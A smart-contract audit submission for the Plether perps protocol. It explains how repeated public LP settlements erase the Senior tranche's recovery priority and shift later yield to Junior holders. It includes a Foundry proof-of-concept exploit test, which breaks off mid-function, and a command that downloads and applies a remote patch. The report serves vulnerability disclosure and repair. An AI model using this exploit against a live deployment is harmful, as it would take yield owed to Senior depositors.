# \#100018 [SC-High] Repeated LP settlement erases Senior recovery priority and diverts later yield to Junior

**Submitted on Nov 16th 2026 at 04:06:58 UTC by @polymix123 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #100018
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Theft of unclaimed yield

## Description

# Repeated LP settlement erases Senior recovery priority and diverts later yield to Junior

## Brief/Intro

After an owner-funded recapitalization is only partially backed, a Junior holder can trigger permissionless LP settlements that repeatedly count already-booked Senior principal as fresh backing for the pending remainder. Each settlement reduces the Senior high-water mark without any economic loss. Once the mark reaches current Senior principal, subsequent trading revenue that should restore Senior instead increases Junior share value. This is theft of unclaimed Senior yield.

## Vulnerability Details

The protocol's waterfall charges losses to Junior before Senior, preserves the Senior high-water mark through losses, and restores Senior to that mark before assigning surplus to Junior ([accounting specification](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L329-L339)). A recapitalization can be partially settled: its full intent sets the Senior recovery target, while the unbacked remainder stays pending. This is exercised by the repository's [partial-settlement regression](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/test/perps/accounting/waterfall/HousePoolWaterfall.t.sol#L177-L219).

Let the pre-recapitalization terminal deficit be `X = 2E`. An honest owner funds `R = X + E = 3E`. The first valid settlement leaves `Senior principal = E`, `Senior HWM = 3E`, and `pending recapitalization = 2E`. No new cash or economic mark is required for the next step. A public settlement can be called again with matured LP epoch work. The recurrence is:

| State | Senior principal | Senior HWM | Pending recapitalization |
|---|---:|---:|---:|
| First partial settlement | `E` | `3E` | `2E` |
| First empty replay | `E` | `2E` | `E` |
| Second empty replay | `E` | `E` | `0` |

The bug is in the interaction of three accounting steps:

1. [`HousePool._settleablePendingClaimantBuckets`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1829-L1834) caps the pending bucket against *total* liability-adjusted distributable equity. It does not subtract equity already represented by Senior principal. In the first replay, the existing `E` of Senior backing is therefore counted again as settleable recapitalization.
2. [`HousePoolReconcilePlanLib.planReconcile`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolReconcilePlanLib.sol#L47-L103) reserves that `E` before comparing the remaining distributable amount with existing principal. It sees zero backing against the existing `E` and records an apparent `E` loss. [`absorbLoss`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol#L167-L184) wipes Senior principal while preserving the high-water mark.
3. [`HousePool._applyPendingClaimantBucketsLive`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1759-L1775) reapplies the reserved `E` and decreases the pending bucket. Because both principals were just zeroed, [`applyClaimantRecapitalizationIntent`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol#L103-L137) takes its empty-principal bootstrap branch and replaces the HWM with `recapitalizationTargetAssets`. That argument is the **current pending bucket**, `2E` on the first replay and `E` on the second, rather than the original `3E` recapitalization intent.

Thus the same `E` of Pool equity is apparently lost and reapplied, while the accepted recovery target ratchets downward. The two replays leave raw Pool cash, accounted Pool cash, canonical Pool cash, trader claims, maximum position liability, and the economic mark unchanged. They also leave the LP share supplies unchanged.

The settlement trigger is public: [`OrderRouter.settleLpEpoch`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouter.sol#L474-L484) atomically refreshes the mark and invokes Pool settlement; [`HousePool.settleLpEpoch`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L794-L835) reconciles before processing the matured queue. A settlement that makes no queue progress reverts. The PoC tests therefore supply genuine matured one-share Junior redemption epochs. At zero Junior NAV these epochs are refunded without transferring Pool cash or burning shares, but they provide bounded queue progress. The owner recapitalization is an honest recovery action, not an attacker privilege.

The same root has a one-replay form: with `R = 2E` and `X = E`, the first settlement leaves `Senior = E`, `HWM = 2E`, `pending = E`; one further economically empty settlement changes that to `Senior = E`, `HWM = E`, `pending = 0`.

### Proof of concept

The common PoC is one Foundry file, `packages/perps/test/foundry/h1/H1ResidualReplay.t.sol`, with shared deployment and helpers and two tests covering the single- and multipass forms. Apply the [PoC gist patch](https://gist.github.com/fuzious/7d35e80ad8198083a117fbae5a755100) at commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`. From that clean checkout, initialize the pinned submodules and run with Forge 1.5.1 and Solc 0.8.35:

```sh
git submodule update --init --recursive
mkdir -p .tmp
curl -fsSL https://gist.githubusercontent.com/fuzious/7d35e80ad8198083a117fbae5a755100/raw/H1_Residual_Recapitalization_PoC.patch -o .tmp/H1_Residual_Recapitalization_PoC.patch
git apply --check .tmp/H1_Residual_Recapitalization_PoC.patch
git apply .tmp/H1_Residual_Recapitalization_PoC.patch
forge test --offline --root packages/perps --match-path 'test/foundry/h1/H1ResidualReplay.t.sol' -vv
```

Both tests in the common file passed on that exact source commit. They use the production V3 Router, Engine, Pool and vault contracts; coherent updates for all six release Pyth feeds; launch risk and Pool/Router settings; distinct Senior and Junior LP owners; genuine public trades, claims and matured LP work. `MockPyth` supplies the external oracle update payload and `MockSettlementToken` supplies a standard six-decimal settlement token. The PoC does not replace an in-scope contract or write its storage. Each test snapshots the same post-recapitalization state and compares an attack branch with a control branch that publishes the same marks at the same times without the extra LP settlements. Both branches then execute the same public revenue-producing trades.

## Impact Details

The multipass test realizes `E = 397,361.928617` six-decimal settlement tokens. Its first settlement sets a `1,192,085.785851` Senior HWM and leaves `794,723.857234` pending. Two public replays reduce the HWM to `397,361.928617` with no change to the economic backing. The later identical trades produce `100,080.000000` of Pool revenue in each branch:

| Final value, in settlement tokens | Attack | Control |
|---|---:|---:|
| Senior HWM | 397,361.928617 | 794,723.857234 |
| Senior principal | 397,361.928617 | 497,441.928617 |
| Junior principal | 100,080.000000 | 0 |
| Pending recapitalization | 0 | 297,281.928617 |

The control's required final settlement also reuses one `E` of booked backing under the same bug, lowering its HWM from `3E` to `2E`. It nevertheless preserves enough Senior recovery gap to receive the `100,080` of new revenue. The attack has consumed the residual and the gap before that revenue arrives. The two branches finish with identical physical and accounted Pool cash, tranche share supplies, total principal, zero outstanding trader claims and zero final position size. The exact `100,080` Senior principal shortfall equals the Junior principal gain, and the distinct Senior LP has lower share value while the Junior LP has higher share value. The PoC measures the value transfer in redeemable tranche claims; it does not rely on an immediate attacker withdrawal in the test transaction.

The single-replay test reaches the same result with one extra public settlement: its HWM falls from `1,589,447.714468` to `794,723.857234` without a new loss, and `100,062.914935` of identical subsequent revenue is assigned to Junior rather than Senior. In that case the final pending recapitalization is zero in both branches.

This is **High — theft of unclaimed yield**. The demonstrated stolen value is future revenue up to the erased Senior recovery gap; the replay itself does not directly withdraw previously booked Senior principal. A Junior holder can prepare dust-sized matured epochs and invoke the public settlement as soon as a partially backed recapitalization exists. The prerequisite large market loss and honest owner recovery affect how often the state occurs, but no malicious owner, forged oracle report, private keeper privilege or nonstandard settlement token behavior is needed for the replay.

## Recommendation

Cap settleable pending recapitalization by equity that is genuinely unassigned after existing tranche principal and relevant reserves, so an unchanged reconciliation cannot treat the same principal as new backing. Persist the original target of each partially settled recapitalization campaign until its residual is exhausted; the shrinking pending amount must not overwrite that accepted target. A regression should assert that an empty second reconciliation preserves `Senior = E`, `HWM = 3E`, `pending = 2E`, and that later genuine revenue restores Senior before Junior. A fresh recapitalization after a genuine full wipe can legitimately establish a new baseline, so the fix should distinguish it from continuation of one partially settled campaign.

## References

- [Audited source at commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`](https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8)
- [Waterfall priority and high-water-mark rule](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L329-L339)
- [Owner recapitalization and pending-intent specification](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L628-L650)
- [`HousePool` pending cap, reconciliation and application](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1552-L1599)
- [`HousePoolReconcilePlanLib` reservation ordering](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolReconcilePlanLib.sol#L47-L103)
- [`HousePoolPendingPreviewLib` bootstrap target](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol#L103-L137)
- [Prior SC-L1 finding and its stated fix](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-pre-audit-report.pdf): the prior report concerned uncapped pending credit and persistent principal overstatement; the present issue concerns replay of already-booked backing and destruction of Senior's HWM after that fix.


## Link to Proof of Concept

https://gist.github.com/fuzious/7d35e80ad8198083a117fbae5a755100

## Proof of Concept

```diff
diff --git a/packages/perps/test/foundry/h1/H1ResidualReplay.t.sol b/packages/perps/test/foundry/h1/H1ResidualReplay.t.sol
new file mode 100644
index 00000000..bcc632d9
--- /dev/null
+++ b/packages/perps/test/foundry/h1/H1ResidualReplay.t.sol
@@ -0,0 +1,676 @@
+// SPDX-License-Identifier: AGPL-3.0
+pragma solidity 0.8.35;
+
+import {MockSettlementToken} from "../../utils/MockSettlementToken.sol";
+import {CfdEngine} from "@plether/perps/CfdEngine.sol";
+import {CfdEngineAdmin} from "@plether/perps/CfdEngineAdmin.sol";
+import {CfdEngineLens} from "@plether/perps/CfdEngineLens.sol";
+import {CfdEnginePlanner} from "@plether/perps/CfdEnginePlanner.sol";
+import {CfdEngineSettlementSidecar} from "@plether/perps/CfdEngineSettlementSidecar.sol";
+import {CfdOrderPolicyEvaluator} from "@plether/perps/CfdOrderPolicyEvaluator.sol";
+import {CfdTypes} from "@plether/perps/CfdTypes.sol";
+import {HousePool} from "@plether/perps/HousePool.sol";
+import {HousePoolRedemptionMathSidecar} from "@plether/perps/HousePoolRedemptionMathSidecar.sol";
+import {MarginClearinghouse} from "@plether/perps/MarginClearinghouse.sol";
+import {OrderLifecycleBook} from "@plether/perps/OrderLifecycleBook.sol";
+import {OrderRouter} from "@plether/perps/OrderRouter.sol";
+import {OrderRouterAdmin} from "@plether/perps/OrderRouterAdmin.sol";
+import {OrderRouterExecutionSidecar} from "@plether/perps/OrderRouterExecutionSidecar.sol";
+import {OrderRouterLiquidationBatchSidecar} from "@plether/perps/OrderRouterLiquidationBatchSidecar.sol";
+import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
+import {PletherOracle} from "@plether/perps/PletherOracle.sol";
+import {TerminalNavBookV2} from "@plether/perps/TerminalNavBookV2.sol";
+import {TrancheVault} from "@plether/perps/TrancheVault.sol";
+import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
+import {IOrderRouterAccounting} from "@plether/perps/interfaces/IOrderRouterAccounting.sol";
+import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
+import {MockPyth} from "@plether/test-utils/MockPyth.sol";
+import {Test} from "forge-std/Test.sol";
+
+/// @dev Launch-configuration reproduction of one and repeated recapitalization replays. Every
+///      trade, mark refresh, and LP reconciliation uses the public production
+///      Router. Recapitalization and degraded-mode recovery use the documented
+///      Engine-owner operations; no Router, Pool, Engine, or vault is impersonated.
+contract H1ResidualReplayTest is Test {
+    uint256 private constant START_TIME = 1_709_532_000;
+    uint256 private constant CAP_PRICE = 2e8;
+    uint256 private constant LOT = CfdTypes.SIZE_QUANTUM;
+
+    address private constant CLAIM_WINNER = address(0xC40001);
+    address private constant FIRST_WINNER = address(0xC40002);
+    address private constant FINAL_LOSER = address(0xC40005);
+    address private constant KEEPER = address(0xC10005);
+    address private constant SENIOR_LP = address(0x5E1100);
+    address private constant JUNIOR_LP = address(0x6A1100);
+    address private constant DUST_LP = address(0xD40000);
+
+    MockSettlementToken private token;
+    MockPyth private pyth;
+    MarginClearinghouse private clearinghouse;
+    CfdEngine private engine;
+    CfdEngineLens private lens;
+    HousePool private pool;
+    TrancheVault private senior;
+    TrancheVault private junior;
+    OrderRouter private router;
+    PletherOracle private oracle;
+    bytes32[] private feedIds;
+    uint256[] private basePrices;
+    uint256 private clientNonce;
+
+    struct BranchResult {
+        uint256 revenueAssets;
+        uint256 rawPoolAssets;
+        uint256 accountedPoolAssets;
+        uint256 seniorPrincipal;
+        uint256 juniorPrincipal;
+        uint256 seniorHighWaterMark;
+        uint256 pendingRecapitalization;
+        uint256 traderClaims;
+        uint256 finalPositionSize;
+        uint256 seniorLpAssets;
+        uint256 juniorLpAssets;
+        uint256 seniorSupply;
+        uint256 juniorSupply;
+    }
+
+    struct EconomicSnapshot {
+        uint256 rawPoolAssets;
+        uint256 accountedPoolAssets;
+        uint256 canonicalPoolAssets;
+        uint256 traderClaims;
+        uint256 maxLiability;
+        uint256 markPrice;
+    }
+
+    function setUp() public {
+        vm.warp(START_TIME);
+        token = new MockSettlementToken();
+        clearinghouse = new MarginClearinghouse(address(token));
+        CfdTypes.RiskParams memory risk = CfdTypes.RiskParams({
+            vpiFactor: 0.01e18,
+            maxSkewRatio: 0.4e18,
+            maintMarginBps: 10,
+            initMarginBps: 20,
+            fadMarginBps: 300,
+            baseCarryBps: 500,
+            minBountyAssets: 1e6,
+            bountyBps: 10,
+            keeperShareBps: 5000,
+            protocolShareBps: 0
+        });
+        engine = new CfdEngine(address(token), address(clearinghouse), CAP_PRICE, risk, 50);
+        CfdEnginePlanner planner = new CfdEnginePlanner();
+        CfdEngineSettlementSidecar settlement = new CfdEngineSettlementSidecar(address(engine));
+        CfdEngineAdmin engineAdmin = new CfdEngineAdmin(address(engine), address(this));
+        engine.setDependencies(address(planner), address(settlement), address(engineAdmin));
+        engine.setTerminalNavBook(address(new TerminalNavBookV2(address(engine), uint32(CAP_PRICE))));
+        lens = new CfdEngineLens(address(engine));
+
+        HousePoolRedemptionMathSidecar poolMath = new HousePoolRedemptionMathSidecar();
+        pool = new HousePool(address(token), address(engine), address(poolMath));
+        senior = new TrancheVault(token, address(pool), true, "Senior", "sAssets", 0, address(0));
+        junior = new TrancheVault(token, address(pool), false, "Junior", "jAssets", 0, address(0));
+        pool.setSeniorVault(address(senior));
+        pool.setJuniorVault(address(junior));
+        engine.setPool(address(pool));
+
+        pyth = new MockPyth();
+        (bytes32[] memory ids, uint256[] memory weights, uint256[] memory bases, bool[] memory inversions) =
+            _releaseTopology();
+        feedIds = ids;
+        basePrices = bases;
+        oracle = new PletherOracle(address(engine), address(pool), address(pyth), ids, weights, bases, inversions);
+
+        CfdOrderPolicyEvaluator evaluator = new CfdOrderPolicyEvaluator();
+        OrderRouterExecutionSidecar execution = new OrderRouterExecutionSidecar();
+        address predicted = vm.computeCreateAddress(address(this), vm.getNonce(address(this)) + 2);
+        OrderLifecycleBook lifecycle =
+            new OrderLifecycleBook(predicted, address(engine), address(clearinghouse), address(pool));
+        OrderRouterLiquidationBatchSidecar liquidation = new OrderRouterLiquidationBatchSidecar(predicted);
+        router = new OrderRouter(
+            address(engine),
+            address(lens),
+            address(pool),
+            address(oracle),
+            address(liquidation),
+            address(evaluator),
+            address(execution),
+            address(lifecycle)
+        );
+        assertEq(address(router), predicted);
+        engine.setOrderRouter(address(router));
+        clearinghouse.setEngine(address(engine));
+
+        _activateReleaseConfig();
+        assertEq(pool.seniorRateBps(), 800, "release Senior coupon remains enabled");
+        // The one-atom adjustment makes the later deficit even so the
+        // X=100 / R=150 / E=50 recurrence can be asserted without rounding.
+        _seedAndFundPool(1_000_000e6 + 1);
+        _warpToNextMondayAtTen();
+        router.updateMarkPrice(_livePayload(100, 100));
+
+        _fundTrader(CLAIM_WINNER, 250_000e6);
+        _fundTrader(FIRST_WINNER, 200_000e6);
+    }
+
+    function test_H1Multipass_ThreeToTwoToOne_EconomicallyEmptyReplays() public {
+        // Forty-nine hourly epochs give four permissionless settlement calls
+        // real work: 16 + 16 + 16 + 1. They cover the initial partial settle,
+        // two economically empty replays, and the final revenue reconcile.
+        // The same Junior holder supplies one share atom per epoch.
+        _prequeueReconcileWork(49);
+        _openBalancedInitialBook();
+
+        _trade(FIRST_WINNER, CfdTypes.Side.LONG, 9_990 * LOT, 0, true, 20, 100);
+        _trade(CLAIM_WINNER, CfdTypes.Side.SHORT, 9_990 * LOT, 0, true, 200, 100);
+        uint256 claimAssets = engine.traderClaimBalanceAssets(CLAIM_WINNER);
+        assertGt(claimAssets, pool.totalAssets(), "ordinary public close must create deficit claim");
+
+        uint256 deficitAssets = pool.getPoolLiquidityView().currentTerminalDeficitAssets;
+        assertGt(deficitAssets, 0, "terminal deficit required");
+        assertEq(deficitAssets % 2, 0, "fixture must realize an even X");
+
+        // Normalized recurrence: pre-recap deficit X=100, post-recap equity
+        // E=50, owner recap R=X+E=150. In concrete 6-decimal values, X=2E
+        // and R=3E exactly.
+        uint256 equityAssets = deficitAssets / 2;
+        uint256 recapAssets = deficitAssets + equityAssets;
+        assertEq(deficitAssets, 2 * equityAssets, "X = 2E");
+        assertEq(recapAssets, 3 * equityAssets, "R = 3E");
+        token.mint(address(this), recapAssets);
+        token.approve(address(engine), recapAssets);
+        engine.recapitalizePool(recapAssets);
+        engine.clearDegradedMode();
+        _reconcileAt(100, 100);
+
+        emit log_named_uint("claim", claimAssets);
+        emit log_named_uint("deficit", deficitAssets);
+        emit log_named_uint("recap", recapAssets);
+        emit log_named_uint("normalized.X", 100);
+        emit log_named_uint("normalized.R", 150);
+        emit log_named_uint("normalized.E", 50);
+        emit log_named_uint("first.principal.E", pool.seniorPrincipal());
+        emit log_named_uint("first.hwm.3E", pool.seniorHighWaterMark());
+        emit log_named_uint("first.pending.2E", pool.pendingRecapitalizationAssets());
+
+        assertEq(pool.seniorPrincipal(), equityAssets, "first pass assigns E");
+        assertEq(pool.seniorHighWaterMark(), 3 * equityAssets, "full 3E intent becomes HWM");
+        assertEq(pool.pendingRecapitalizationAssets(), 2 * equityAssets, "2E remains pending");
+        assertGt(senior.totalSupply(), 0, "wiped Senior owners survive");
+        assertGt(junior.totalSupply(), 0, "wiped Junior owners survive");
+        uint256 originalHighWaterMark = pool.seniorHighWaterMark();
+        (, uint256 workAfterFirstSettle) = junior.getMaturedRedeemHead(vm.getBlockTimestamp() / 1 hours);
+        assertGt(workAfterFirstSettle, 0, "first public settlement leaves bounded mature work");
+
+        assertEq(pool.pendingRecapitalizationAssets(), 2 * pool.seniorPrincipal(), "two E-sized replays remain");
+
+        // Fork the exact post-recap state. The only branch difference is two
+        // public LP settlements versus two authenticated same-price mark
+        // publications. Time, blocks, final trades, and the final settlement
+        // are otherwise identical.
+        uint256 branchSnapshot = vm.snapshotState();
+        BranchResult memory attack = _runPostRecapBranch(true, equityAssets);
+        assertTrue(vm.revertToState(branchSnapshot), "restore post-recap snapshot");
+        BranchResult memory control = _runPostRecapBranch(false, equityAssets);
+
+        emit log_named_uint("attack.hwm", attack.seniorHighWaterMark);
+        emit log_named_uint("control.hwm", control.seniorHighWaterMark);
+        emit log_named_uint("identical.revenue", attack.revenueAssets);
+        emit log_named_uint("attack.senior", attack.seniorPrincipal);
+        emit log_named_uint("control.senior", control.seniorPrincipal);
+        emit log_named_uint("attack.junior", attack.juniorPrincipal);
+        emit log_named_uint("control.junior", control.juniorPrincipal);
+        emit log_named_uint("attack.senior.lp.assets", attack.seniorLpAssets);
+        emit log_named_uint("control.senior.lp.assets", control.seniorLpAssets);
+        emit log_named_uint("attack.junior.lp.assets", attack.juniorLpAssets);
+        emit log_named_uint("control.junior.lp.assets", control.juniorLpAssets);
+
+        assertEq(attack.revenueAssets, control.revenueAssets, "same public losing trade creates the same revenue");
+        assertEq(attack.rawPoolAssets, control.rawPoolAssets, "branches end with identical physical Pool cash");
+        assertEq(
+            attack.accountedPoolAssets, control.accountedPoolAssets, "branches end with identical accounted Pool cash"
+        );
+        assertEq(attack.seniorSupply, control.seniorSupply, "zero-value epoch work cannot change Senior supply");
+        assertEq(attack.juniorSupply, control.juniorSupply, "zero-value epoch work cannot change Junior supply");
+        assertEq(
+            attack.seniorPrincipal + attack.juniorPrincipal,
+            control.seniorPrincipal + control.juniorPrincipal,
+            "same total principal is reclassified between the tranches"
+        );
+        assertEq(attack.traderClaims, 0, "attack claims terminal");
+        assertEq(control.traderClaims, 0, "control claims terminal");
+        assertEq(attack.finalPositionSize, 0, "attack positions terminal");
+        assertEq(control.finalPositionSize, 0, "control positions terminal");
+        assertEq(attack.pendingRecapitalization, 0, "two empty replays consume the residual");
+        assertEq(
+            control.pendingRecapitalization,
+            equityAssets - control.revenueAssets,
+            "control preserves the unbacked residual after applying only genuine revenue"
+        );
+
+        assertEq(originalHighWaterMark, 3 * equityAssets, "initial normalized HWM is 150");
+        assertEq(attack.seniorHighWaterMark, equityAssets, "two empty replays end at normalized 50");
+        assertEq(control.seniorHighWaterMark, 2 * equityAssets, "control final reconcile remains at normalized 100");
+        assertEq(attack.seniorPrincipal, equityAssets, "attack leaves Senior at truncated E target");
+        assertEq(attack.juniorPrincipal, attack.revenueAssets, "attack diverts all later revenue to Junior");
+        assertEq(
+            control.seniorPrincipal,
+            equityAssets + control.revenueAssets,
+            "control restores the same later revenue to Senior"
+        );
+        assertEq(control.juniorPrincipal, 0, "control gives Junior none before Senior restoration");
+        assertEq(
+            control.seniorPrincipal - attack.seniorPrincipal,
+            attack.juniorPrincipal - control.juniorPrincipal,
+            "Senior loss equals Junior gain exactly"
+        );
+        assertGt(control.seniorLpAssets, attack.seniorLpAssets, "distinct Senior victim loses share value");
+        assertGt(attack.juniorLpAssets, control.juniorLpAssets, "distinct Junior holder captures share value");
+    }
+
+    function test_H1SingleReplay_TwoToOne_EconomicallyEmptyReplay() public {
+        // 33 distinct mature epochs provide work for the initial settlement,
+        // one extra public replay, and the final revenue settlement.
+        _prequeueReconcileWork(33);
+        _openBalancedInitialBook();
+
+        _trade(FIRST_WINNER, CfdTypes.Side.LONG, 9_990 * LOT, 0, true, 20, 100);
+        _trade(CLAIM_WINNER, CfdTypes.Side.SHORT, 9_990 * LOT, 0, true, 200, 100);
+        uint256 claimAssets = engine.traderClaimBalanceAssets(CLAIM_WINNER);
+        assertGt(claimAssets, pool.totalAssets(), "ordinary public close must create deficit claim");
+
+        uint256 equityAssets = pool.getPoolLiquidityView().currentTerminalDeficitAssets;
+        assertGt(equityAssets, 0, "terminal deficit required");
+        uint256 recapAssets = 2 * equityAssets;
+        token.mint(address(this), recapAssets);
+        token.approve(address(engine), recapAssets);
+        engine.recapitalizePool(recapAssets);
+        engine.clearDegradedMode();
+        _reconcileAt(100, 100);
+
+        assertEq(pool.seniorPrincipal(), equityAssets, "first pass assigns E");
+        assertEq(pool.seniorHighWaterMark(), recapAssets, "full 2E intent becomes HWM");
+        assertEq(pool.pendingRecapitalizationAssets(), equityAssets, "E remains pending");
+        assertGt(senior.totalSupply(), 0, "wiped Senior owners survive");
+        assertGt(junior.totalSupply(), 0, "wiped Junior owners survive");
+        (, uint256 workAfterFirstSettle) = junior.getMaturedRedeemHead(vm.getBlockTimestamp() / 1 hours);
+        assertGt(workAfterFirstSettle, 0, "first public settlement leaves mature work");
+
+        uint256 branchSnapshot = vm.snapshotState();
+        BranchResult memory attack = _runSingleReplayBranch(true, equityAssets);
+        assertTrue(vm.revertToState(branchSnapshot), "restore post-recap snapshot");
+        BranchResult memory control = _runSingleReplayBranch(false, equityAssets);
+
+        emit log_named_uint("single.first.senior.principal", equityAssets);
+        emit log_named_uint("single.first.senior.hwm", recapAssets);
+        emit log_named_uint("single.attack.hwm", attack.seniorHighWaterMark);
+        emit log_named_uint("single.control.hwm", control.seniorHighWaterMark);
+        emit log_named_uint("single.identical.revenue", attack.revenueAssets);
+        emit log_named_uint("single.attack.senior", attack.seniorPrincipal);
+        emit log_named_uint("single.control.senior", control.seniorPrincipal);
+        emit log_named_uint("single.attack.junior", attack.juniorPrincipal);
+        emit log_named_uint("single.control.junior", control.juniorPrincipal);
+
+        assertEq(attack.revenueAssets, control.revenueAssets, "same trade creates the same revenue");
+        assertEq(attack.rawPoolAssets, control.rawPoolAssets, "same physical Pool cash");
+        assertEq(attack.accountedPoolAssets, control.accountedPoolAssets, "same accounted Pool cash");
+        assertEq(attack.seniorSupply, control.seniorSupply, "same Senior supply");
+        assertEq(attack.juniorSupply, control.juniorSupply, "same Junior supply");
+        assertEq(
+            attack.seniorPrincipal + attack.juniorPrincipal,
+            control.seniorPrincipal + control.juniorPrincipal,
+            "same total principal is reclassified between tranches"
+        );
+        assertEq(attack.traderClaims, 0, "attack claims terminal");
+        assertEq(control.traderClaims, 0, "control claims terminal");
+        assertEq(attack.finalPositionSize, 0, "attack positions terminal");
+        assertEq(control.finalPositionSize, 0, "control positions terminal");
+        assertEq(attack.pendingRecapitalization, 0, "attack residual consumed");
+        assertEq(control.pendingRecapitalization, 0, "control residual consumed");
+        assertEq(attack.seniorHighWaterMark, equityAssets, "replay overwrites HWM with residual");
+        assertEq(control.seniorHighWaterMark, recapAssets, "control preserves full recovery target");
+        assertEq(attack.seniorPrincipal, equityAssets, "attack Senior remains at E");
+        assertEq(attack.juniorPrincipal, attack.revenueAssets, "attack diverts revenue to Junior");
+        assertEq(control.seniorPrincipal, equityAssets + control.revenueAssets, "control restores Senior");
+        assertEq(control.juniorPrincipal, 0, "control gives Junior no premature revenue");
+        assertEq(
+            control.seniorPrincipal - attack.seniorPrincipal,
+            attack.juniorPrincipal - control.juniorPrincipal,
+            "Senior shortfall equals Junior gain"
+        );
+        assertGt(control.seniorLpAssets, attack.seniorLpAssets, "Senior victim loses share value");
+        assertGt(attack.juniorLpAssets, control.juniorLpAssets, "Junior holder gains share value");
+    }
+
+    function _runSingleReplayBranch(bool replay, uint256 equityAssets) private returns (BranchResult memory result) {
+        EconomicSnapshot memory beforeReplay = _economicSnapshot();
+        assertEq(beforeReplay.maxLiability, 0, "single replay has no position liability");
+        if (replay) {
+            _reconcileAt(100, 100);
+            _assertEconomicsUnchanged(beforeReplay, "single-replay");
+            assertEq(pool.seniorPrincipal(), equityAssets, "replay keeps S=E");
+            assertEq(pool.seniorHighWaterMark(), equityAssets, "replay truncates HWM to E");
+            assertEq(pool.pendingRecapitalizationAssets(), 0, "replay consumes residual");
+            (, uint256 workBeforeFinalSettle) = junior.getMaturedRedeemHead(vm.getBlockTimestamp() / 1 hours);
+            assertEq(workBeforeFinalSettle, 1, "one mature epoch remains for final settlement");
+        } else {
+            router.updateMarkPrice(_livePayload(100, 100));
+            _assertEconomicsUnchanged(beforeReplay, "single-control-mark");
+            assertEq(pool.seniorHighWaterMark(), 2 * equityAssets, "mark alone preserves full HWM");
+            assertEq(pool.pendingRecapitalizationAssets(), equityAssets, "mark leaves residual pending");
+        }
+
+        vm.prank(CLAIM_WINNER);
+        engine.settleTraderClaim(CLAIM_WINNER);
+        _fundTrader(FINAL_LOSER, 180_000e6);
+        uint256 cashBeforeRevenue = pool.totalAssets();
+        _trade(FINAL_LOSER, CfdTypes.Side.LONG, 1_000 * LOT, 150_000e6, false, 100, 100);
+        _trade(FINAL_LOSER, CfdTypes.Side.LONG, 1_000 * LOT, 0, true, 200, 100);
+        result.revenueAssets = pool.totalAssets() - cashBeforeRevenue;
+        _reconcileAt(200, 100);
+
+        result.rawPoolAssets = pool.rawAssets();
+        result.accountedPoolAssets = pool.accountedAssets();
+        result.seniorPrincipal = pool.seniorPrincipal();
+        result.juniorPrincipal = pool.juniorPrincipal();
+        result.seniorHighWaterMark = pool.seniorHighWaterMark();
+        result.pendingRecapitalization = pool.pendingRecapitalizationAssets();
+        result.traderClaims = engine.totalTraderClaimBalanceAssets();
+        (uint256 finalPositionSize,,,,,,) = engine.positions(FINAL_LOSER);
+        result.finalPositionSize = finalPositionSize;
+        result.seniorLpAssets = senior.convertToAssets(senior.balanceOf(SENIOR_LP));
+        result.juniorLpAssets = junior.convertToAssets(junior.balanceOf(JUNIOR_LP));
+        result.seniorSupply = senior.totalSupply();
+        result.juniorSupply = junior.totalSupply();
+    }
+
+    function _runPostRecapBranch(
+        bool eraseWithExtraSettlement,
+        uint256 equityAssets
+    ) private returns (BranchResult memory result) {
+        EconomicSnapshot memory beforeReplay = _economicSnapshot();
+        assertEq(beforeReplay.maxLiability, 0, "the replay has no position liability");
+
+        if (eraseWithExtraSettlement) {
+            // Replay 1: 3E -> 2E with no physical/accounting/claim/liability
+            // change and the same economic mark price.
+            _reconcileAt(100, 100);
+            _assertEconomicsUnchanged(beforeReplay, "replay-1");
+            assertEq(pool.seniorPrincipal(), equityAssets, "replay 1 keeps S=E");
+            assertEq(pool.seniorHighWaterMark(), 2 * equityAssets, "replay 1: normalized 150 -> 100");
+            assertEq(pool.pendingRecapitalizationAssets(), equityAssets, "replay 1 leaves E pending");
